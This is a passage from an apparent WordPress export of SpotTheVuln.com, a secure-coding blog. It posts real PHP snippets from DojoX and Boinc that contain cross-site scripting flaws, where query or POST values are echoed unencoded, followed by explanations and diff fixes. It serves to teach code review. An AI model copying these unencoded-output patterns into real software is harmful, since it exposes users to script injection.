			<wp:comment_author><![CDATA[Tweets that mention Carriage Return/Line Feed (CRLF) Injection, HTTP header injection, PHP, Solution, Wordpress Vulnerability Code Example ~SpotTheVuln.com -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2010/10/creative-http-header-injection/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2010-10-23 16:43:01</wp:comment_date>
			<wp:comment_date_gmt>2010-10-23 23:43:01</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by OWASP Feed, Spot The Vuln. Spot The Vuln said: New Post: Creative - HTTP Header Injection http://bit.ly/9duePL #secure #code #dev [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Expect</title>
		<link>http://spotthevuln.com/2010/10/expect/</link>
		<pubDate>Mon, 25 Oct 2010 15:00:54 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1177</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>We cannot expect people to have respect for law and order until we teach respect to those we have entrusted to enforce those laws.</strong><strong>
</strong> <strong> -Hunter S. Thompson
</strong></blockquote>
<pre lang="php">
<?php
	// this file is just a bouncer for ContentPane.html test
	error_reporting(E_ALL ^ E_NOTICE);
	
	if(isset($_GET['mode'])){
		switch($_GET['mode']){
			case 'htmlPaths':
				echo "<img src='../images/testImage.gif' id='imgTest'/>
					<div id='inlineStyleTest' style='width:188px;height:125px;background-image:url(../images/testImage.gif)'></div>
					<style>@import 'getResponse.php?mode=importCss';</style>
					<link type='text/css' rel='stylesheet' href='getResponse.php?mode=linkCss'>
					<div id='importCssTest'></div>
					<div id='linkCssTest'></div>
					<div id='importMediaTest'></div>
					<div id='linkMediaTest'></div>
					<!-- these may download but not render -->
					<style media='print'>@import 'getResponse.php?mode=importMediaPrint';</style>
					<link media='print' type='text/css' rel='stylesheet' href='getResponse.php?mode=linkMediaPrint'>
					";
				break;
	
			case 'importCss':
				header('Content-type: text/css; charset=utf-8');
				echo "#importMediaTest {
					margin: 4px;
					border: 1px dashed red;
					width: 200px;
					height: 200px;
				}
				#importCssTest {
						margin: 4px;
						border: 1px solid blue;
						width: 100px;
						height: 100px;
					}";
				break;
	
			case 'linkCss':
				header('Content-type: text/css; charset=utf-8');
				echo "#linkMediaTest {
					margin: 4px;
					border: 2px dashed red;
					width: 200px;
					height: 200px;
				}
				#linkCssTest {
					margin: 4px;
					border: 2px dashed red;
					width: 100px;
					height: 100px;
				}";
				break;

			case 'importMediaPrint': // may download but not render
				header('Content-type: text/css; charset=utf-8');
				echo "#importMediaTest {
					margin: 10px;
					border: 5px dashed gray;
					width: 100px;
					height: 100px;
				}";
				break;

			case 'linkMediaPrint': // may download but not render
				header('Content-type: text/css; charset=utf-8');
				echo "#linkMediaTest {
					margin: 10px;
					border: 5px dashed gray;
					width: 100px;
					height: 100px;
				}";
				break;
	
			case 'remoteJsTrue':
				header('Content-type: text/javascript; charset=utf-8');
				echo "unTypedVarInDocScope = true;";
				break;
	
			case 'remoteJsFalse':
				header('Content-type: text/javascript; charset=utf-8');
				echo "unTypedVarInDocScope = false;";
				break;
			case 'entityChars':
				header('Content-type: text/css; charset=utf-8');
				if($_GET['entityEscaped'] == null){                                                                                    
					print("var div = document.createElement(\"div\"); document.body.appendChild(div); div.innerHTML = \"<div id=\\\"should_not_be_here2\\\"></div>\"; window.__remotePaneLoaded2 = true;" );
				}else{
					print("window.__remotePaneLoaded2 = true;");
				}
				break;
			default:
				echo "unkown mode {$_GET['mode']}"; 
		}
	}
?>
</pre>

﻿]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1177</wp:post_id>
		<wp:post_date>2010-10-25 08:00:54</wp:post_date>
		<wp:post_date_gmt>2010-10-25 15:00:54</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>expect</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/coXwRa]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[5f23596839da464383baa6ff7c92f7c3]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>909</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), DoJo, PHP, Solution Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/10/expect-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-10-29 08:08:25</wp:comment_date>
			<wp:comment_date_gmt>2010-10-29 15:08:25</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Expect [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Expect - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/10/expect-cross-site-scripting/</link>
		<pubDate>Fri, 29 Oct 2010 15:00:03 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1180</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: DojoX

Fixed in Version: 1.4.1

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Expect" href="http://spotthevuln.com/2010/10/expect/" target="_blank">Found    Here</a>
<h2>Description</h2>
This week’s bug was an easy one with a straightforward fix.  The vulnerable code sample is basically a single switch statement.  Most of the cases don’t do anything interesting (from a security standpoint) however, the default case at the end of the switch statement leads to a vulnerable condition.  If all of the case statements fail, the application throws a useful error message echoing back a value directly from the query string.  The DojoX developers addressed the vulnerability by html encoding the value before echoing it back to the user.  Simple bug, simple fix.  I hope all the readers have a good weekend and a Happy Halloween!
<h2>Developers Solution</h2>
[sourcecode language="diff"]
&lt;?php
	// this file is just a bouncer for ContentPane.html test
	error_reporting(E_ALL ^ E_NOTICE);
	
	if(isset($_GET['mode'])){
		switch($_GET['mode']){
			case 'htmlPaths':
				echo &quot;&lt;img src='../images/testImage.gif' id='imgTest'/&gt;
					&lt;div id='inlineStyleTest' style='width:188px;height:125px;background-image:url(../images/testImage.gif)'&gt;&lt;/div&gt;
					&lt;style&gt;@import 'getResponse.php?mode=importCss';&lt;/style&gt;
					&lt;link type='text/css' rel='stylesheet' href='getResponse.php?mode=linkCss'&gt;
					&lt;div id='importCssTest'&gt;&lt;/div&gt;
					&lt;div id='linkCssTest'&gt;&lt;/div&gt;
					&lt;div id='importMediaTest'&gt;&lt;/div&gt;
					&lt;div id='linkMediaTest'&gt;&lt;/div&gt;
					&lt;!-- these may download but not render --&gt;
					&lt;style media='print'&gt;@import 'getResponse.php?mode=importMediaPrint';&lt;/style&gt;
					&lt;link media='print' type='text/css' rel='stylesheet' href='getResponse.php?mode=linkMediaPrint'&gt;
					&quot;;
				break;
	
			case 'importCss':
				header('Content-type: text/css; charset=utf-8');
				echo &quot;#importMediaTest {
					margin: 4px;
					border: 1px dashed red;
					width: 200px;
					height: 200px;
				}
				#importCssTest {
						margin: 4px;
						border: 1px solid blue;
						width: 100px;
						height: 100px;
					}&quot;;
				break;
	
			case 'linkCss':
				header('Content-type: text/css; charset=utf-8');
				echo &quot;#linkMediaTest {
					margin: 4px;
					border: 2px dashed red;
					width: 200px;
					height: 200px;
				}
				#linkCssTest {
					margin: 4px;
					border: 2px dashed red;
					width: 100px;
					height: 100px;
				}&quot;;
				break;

			case 'importMediaPrint': // may download but not render
				header('Content-type: text/css; charset=utf-8');
				echo &quot;#importMediaTest {
					margin: 10px;
					border: 5px dashed gray;
					width: 100px;
					height: 100px;
				}&quot;;
				break;

			case 'linkMediaPrint': // may download but not render
				header('Content-type: text/css; charset=utf-8');
				echo &quot;#linkMediaTest {
					margin: 10px;
					border: 5px dashed gray;
					width: 100px;
					height: 100px;
				}&quot;;
				break;
	
			case 'remoteJsTrue':
				header('Content-type: text/javascript; charset=utf-8');
				echo &quot;unTypedVarInDocScope = true;&quot;;
				break;
	
			case 'remoteJsFalse':
				header('Content-type: text/javascript; charset=utf-8');
				echo &quot;unTypedVarInDocScope = false;&quot;;
				break;
			case 'entityChars':
				header('Content-type: text/css; charset=utf-8');
				if($_GET['entityEscaped'] == null){                                                                                    
					print(&quot;var div = document.createElement(\&quot;div\&quot;); document.body.appendChild(div); div.innerHTML = \&quot;&lt;div id=\\\&quot;should_not_be_here2\\\&quot;&gt;&lt;/div&gt;\&quot;; window.__remotePaneLoaded2 = true;&quot; );
				}else{
					print(&quot;window.__remotePaneLoaded2 = true;&quot;);
				}
				break;
			default:
-				echo &quot;unkown mode {$_GET['mode']}&quot;; 
+				echo &quot;unkown mode {htmlentities($_GET['mode'])}&quot;;
		}
	}
?&gt;

[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1180</wp:post_id>
		<wp:post_date>2010-10-29 08:00:03</wp:post_date>
		<wp:post_date_gmt>2010-10-29 15:00:03</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>expect-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="bugs"><![CDATA[bugs]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="default-case"><![CDATA[default case]]></category>
		<category domain="category" nicename="dojo"><![CDATA[DoJo]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="post_tag" nicename="html-encoding"><![CDATA[html encoding]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="querystring"><![CDATA[querystring]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="post_tag" nicename="switch-statement"><![CDATA[switch statement]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dyZoQ3]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[d0921adfede00884bb3a3144dd5aa7ba]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Expands</title>
		<link>http://spotthevuln.com/2010/11/expands/</link>
		<pubDate>Mon, 01 Nov 2010 15:00:34 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1183</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Life shrinks or expands in proportion to one's courage.</strong><strong>
</strong> <strong> -Anais Nin
</strong></blockquote>
Hint: post_str() gets values from the POST request body
<pre lang="php">
<?php

require_once("boinc_db.inc");
require_once("sanitize_html.inc");
require_once("bbcode_html.inc");

function pm_header() {
    echo "<div>\n";
    echo "    <a href=\"pm.php?action=inbox\">".tra("Inbox")."</a>\n";
    echo "    | <a href=\"pm.php?action=new\">".tra("Write")."</a>\n";
    echo "</div>\n";
}

function pm_form($error = null) {
    global $bbcode_html, $bbcode_js;
    global $g_logged_in_user;
    page_head(tra("Send private message"),'','','', $bbcode_js);
    
    if (post_str("preview", true) == tra("Preview")) {
        $options = new output_options;
        echo "<div id=\"preview\">\n";
        echo "<div class=\"header\">".tra("Preview")."</div>\n";
        echo output_transform(post_str("content", true), $options);
        echo "</div>\n";
    }
    
    $replyto = get_int("replyto", true);
    $userid = get_int("userid", true);
    
    $subject = null;
    $content = null;
    if ($replyto) {
        $message = BoincPrivateMessage::lookup_id($replyto);
        if (!$message || $message->userid != $g_logged_in_user->id) {
            error_page("no such message");
        }
        $content = "[quote]".$message->content."[/quote]\n";
        $userid = $message->senderid;
        $user = BoincUser::lookup_id($userid);
        if ($user != null) {
            $writeto = $userid." (".$user->name.")";
        }
        $subject = $message->subject;
        if (substr($subject, 0, 3) != "re:") {
            $subject = "re: ".$subject;
        }
    } elseif ($userid) {
        $user = BoincUser::lookup_id($userid);
        if ($user) {
            $writeto = $userid." (".$user->name.")";
        }
    } else {
        $writeto = post_str("to", true);
        $subject = post_str("subject", true);
        $content = post_str("content", true);
    }
    
    $content = htmlspecialchars($content);
    $subject = htmlspecialchars($subject);
    
    if ($error != null) {
        echo "<div class=\"error\">".$error."</div>\n";
    }
    
    echo "<form action=\"pm.php\" method=\"post\" name=\"post\" onsubmit=\"return checkForm(this)\">\n";
    echo "<input type=\"hidden\" name=\"action\" value=\"send\">\n";
    echo form_tokens($g_logged_in_user->authenticator);
    start_table();
    row2(tra("To")."<br /><span class=\"smalltext\">".tra("User IDs or unique usernames, separated with commas")."</span>",
        "<input type=\"text\" name=\"to\" value=\"$writeto\" size=\"60\">"
    );
    row2(tra("Subject"), "<input type=\"text\" name=\"subject\" value=\"$subject\" size=\"60\">");
    row2(tra("Message")."<span class=\"smalltext\">".html_info()."</span>",
        $bbcode_html."<textarea name=\"content\" rows=\"18\" cols=\"80\">$content</textarea>"
    );
    echo "<tr><td></td><td><input type=\"submit\" name=\"preview\" value=\"".tra("Preview")."\"> <input type=\"submit\" value=\"".tra("Send message")."\"></td></tr>\n";
    end_table();
    
    page_tail();
    exit();
}

function send_pm_notification_email(
    $logged_in_user, $to_user, $subject, $content
) {
    $message  = "
You have received a new private message at ".PROJECT.".

From: $logged_in_user->name (ID $logged_in_user->id)
Subject: $subject

$content

--------------------------
To delete or respond to this message, visit:
".URL_BASE."pm.php

To change email preferences, visit:
".URL_BASE."edit_forum_preferences_form.php
Do not reply to this message.
" ;
    send_email($to_user, "[".PROJECT."] ".tra("- private message"), $message);
}

?>
</pre>

﻿]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1183</wp:post_id>
		<wp:post_date>2010-11-01 08:00:34</wp:post_date>
		<wp:post_date_gmt>2010-11-01 15:00:34</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>expands</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/aKThXb]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[e7ccedc908a2a75a74a19843699b767d]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>927</wp:comment_id>
			<wp:comment_author><![CDATA[Boinc, Cross-Site Scripting (XSS), PHP, Solution Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/11/expands-xss/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-11-05 08:16:22</wp:comment_date>
			<wp:comment_date_gmt>2010-11-05 15:16:22</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Expands [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Expands - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/11/expands-xss/</link>
		<pubDate>Fri, 05 Nov 2010 15:16:15 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1187</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Boinc

Fixed in Version: N/A

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Expect" href="http://spotthevuln.com/2010/11/expands/" target="_blank">Found    Here</a>
<h2>Description</h2>
The hint pretty much gave this one away.

This week’s bug was an XSS exposure in Boinc.  Boinc is an open source project which uses idle time on a computer to perform various scientific tasks.  According to the website, its “safe, secure, and easy”. Boinc doesn’t seem to have version numbers and is updated on a constant basis.  This bug was checked into the Boinc source about four weeks ago.

The bug can be found in the else statement in the pm_form() function.  The else statement takes a tainted value from the POST request body and uses it to populate a variable.  The variable assignment is here:
<blockquote>$writeto = post_str("to", true);
$subject = post_str("subject", true);
$content = post_str("content", true);</blockquote>
The hint lets us know that post_str takes values from the POST request body.  Even if a hint wasn’t provided, you could have guessed that values coming from post_str() were tainted by looking at the first two lines of code outside of the if/else statement:
<blockquote>$content = htmlspecialchars($content);
$subject = htmlspecialchars($subject);</blockquote>
The two lines above show that the author was careful to encode the $subject and $content variables before using them in markup.  Although the $writeto variable was assigned in a similar manner and even in the same code block, it doesn’t undergo any encoding.  $writeto is then used in the markup in the code provided below, resulting in XSS:
<blockquote>"&lt;input type=\"text\" name=\"to\" value=\"$writeto\" size=\"60\"&gt;"</blockquote>
Some other interesting items.  This page is using the .inc extension for includes.  Hopefully, the correct extension mappings are done to avoid source code disclosure of includes.  While the application logic is open source, I’m sure there are configuration settings like database connection strings which could be exposed.  Also, instead of using htmlspecialchars() to encode $writeto, the developers chose to use a function named sanitize_tags().  I hope sanitize tags defends against attribute injection which doesn’t require any HTML tags!
<h2>Developers Solution</h2>
[sourcecode language="diff"]
&lt;?php

require_once(&quot;boinc_db.inc&quot;);
require_once(&quot;sanitize_html.inc&quot;);
require_once(&quot;bbcode_html.inc&quot;);

function pm_header() {
    echo &quot;&lt;div&gt;\n&quot;;
    echo &quot;    &lt;a href=\&quot;pm.php?action=inbox\&quot;&gt;&quot;.tra(&quot;Inbox&quot;).&quot;&lt;/a&gt;\n&quot;;
    echo &quot;    | &lt;a href=\&quot;pm.php?action=new\&quot;&gt;&quot;.tra(&quot;Write&quot;).&quot;&lt;/a&gt;\n&quot;;
    echo &quot;&lt;/div&gt;\n&quot;;
}

function pm_form($error = null) {
    global $bbcode_html, $bbcode_js;
    global $g_logged_in_user;
    page_head(tra(&quot;Send private message&quot;),'','','', $bbcode_js);

    if (post_str(&quot;preview&quot;, true) == tra(&quot;Preview&quot;)) {
        $options = new output_options;
        echo &quot;&lt;div id=\&quot;preview\&quot;&gt;\n&quot;;
        echo &quot;&lt;div class=\&quot;header\&quot;&gt;&quot;.tra(&quot;Preview&quot;).&quot;&lt;/div&gt;\n&quot;;
        echo output_transform(post_str(&quot;content&quot;, true), $options);
        echo &quot;&lt;/div&gt;\n&quot;;
    }

    $replyto = get_int(&quot;replyto&quot;, true);
    $userid = get_int(&quot;userid&quot;, true);

    $subject = null;
    $content = null;
    if ($replyto) {
        $message = BoincPrivateMessage::lookup_id($replyto);
        if (!$message || $message-&gt;userid != $g_logged_in_user-&gt;id) {
            error_page(&quot;no such message&quot;);
        }
        $content = &quot;[quote]&quot;.$message-&gt;content.&quot;[/quote]\n&quot;;
        $userid = $message-&gt;senderid;
        $user = BoincUser::lookup_id($userid);
        if ($user != null) {
            $writeto = $userid.&quot; (&quot;.$user-&gt;name.&quot;)&quot;;
        }
        $subject = $message-&gt;subject;
        if (substr($subject, 0, 3) != &quot;re:&quot;) {
            $subject = &quot;re: &quot;.$subject;
        }
    } elseif ($userid) {
        $user = BoincUser::lookup_id($userid);
        if ($user) {
            $writeto = $userid.&quot; (&quot;.$user-&gt;name.&quot;)&quot;;
        }
    } else {
-       $writeto = post_str(&quot;to&quot;, true);
+		$writeto = sanitize_tags(post_str(&quot;to&quot;, true));
        $subject = post_str(&quot;subject&quot;, true);
        $content = post_str(&quot;content&quot;, true);
    }

    $content = htmlspecialchars($content);
    $subject = htmlspecialchars($subject);

    if ($error != null) {
        echo &quot;&lt;div class=\&quot;error\&quot;&gt;&quot;.$error.&quot;&lt;/div&gt;\n&quot;;
    }

    echo &quot;&lt;form action=\&quot;pm.php\&quot; method=\&quot;post\&quot; name=\&quot;post\&quot; onsubmit=\&quot;return checkForm(this)\&quot;&gt;\n&quot;;
    echo &quot;&lt;input type=\&quot;hidden\&quot; name=\&quot;action\&quot; value=\&quot;send\&quot;&gt;\n&quot;;
    echo form_tokens($g_logged_in_user-&gt;authenticator);
    start_table();
    row2(tra(&quot;To&quot;).&quot;&lt;br /&gt;&lt;span class=\&quot;smalltext\&quot;&gt;&quot;.tra(&quot;User IDs or unique usernames, separated with commas&quot;).&quot;&lt;/span&gt;&quot;,
        &quot;&lt;input type=\&quot;text\&quot; name=\&quot;to\&quot; value=\&quot;$writeto\&quot; size=\&quot;60\&quot;&gt;&quot;
    );
    row2(tra(&quot;Subject&quot;), &quot;&lt;input type=\&quot;text\&quot; name=\&quot;subject\&quot; value=\&quot;$subject\&quot; size=\&quot;60\&quot;&gt;&quot;);
    row2(tra(&quot;Message&quot;).&quot;&lt;span class=\&quot;smalltext\&quot;&gt;&quot;.html_info().&quot;&lt;/span&gt;&quot;,
        $bbcode_html.&quot;&lt;textarea name=\&quot;content\&quot; rows=\&quot;18\&quot; cols=\&quot;80\&quot;&gt;$content&lt;/textarea&gt;&quot;
    );
    echo &quot;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\&quot;submit\&quot; name=\&quot;preview\&quot; value=\&quot;&quot;.tra(&quot;Preview&quot;).&quot;\&quot;&gt; &lt;input type=\&quot;submit\&quot; value=\&quot;&quot;.tra(&quot;Send message&quot;).&quot;\&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\n&quot;;
    end_table();

    page_tail();
    exit();
}

function send_pm_notification_email(
    $logged_in_user, $to_user, $subject, $content
) {
    $message  = &quot;
You have received a new private message at &quot;.PROJECT.&quot;.

From: $logged_in_user-&gt;name (ID $logged_in_user-&gt;id)
Subject: $subject

$content

--------------------------
To delete or respond to this message, visit:
&quot;.URL_BASE.&quot;pm.php

To change email preferences, visit:
&quot;.URL_BASE.&quot;edit_forum_preferences_form.php
Do not reply to this message.
&quot; ;
    send_email($to_user, &quot;[&quot;.PROJECT.&quot;] &quot;.tra(&quot;- private message&quot;), $message);
}

?&gt;

[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1187</wp:post_id>
		<wp:post_date>2010-11-05 08:16:15</wp:post_date>
		<wp:post_date_gmt>2010-11-05 15:16:15</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>expands-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="attribute"><![CDATA[attribute]]></category>
		<category domain="category" nicename="boinc"><![CDATA[Boinc]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="disclosure"><![CDATA[disclosure]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="post_tag" nicename="htmlspecialchars"><![CDATA[htmlspecialchars]]></category>
		<category domain="post_tag" nicename="open-source-project"><![CDATA[open source project]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="request-body"><![CDATA[request body]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dejILy]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[862d5ada00665af351dea81e08421282]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[862d5ada00665af351dea81e08421282]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Vulnerability</title>
		<link>http://spotthevuln.com/2010/11/vulnerability/</link>
		<pubDate>Mon, 08 Nov 2010 15:00:56 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1195</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>In ancient times skillful warriors first made themselves invincible, and then watched for vulnerability in their opponents</strong><strong>.</strong><strong>
</strong> <strong> -Sun Tzu
</strong></blockquote>

<pre lang="php">
﻿<?php

	function convert_all_confirm() {
		print '<div class="narrow">';

		print '<h3>' . __('Confirm') . '</h3>';

		print '<p>' . __('You are about to convert all categories to tags. Are you sure you want to continue?') . '</p>';

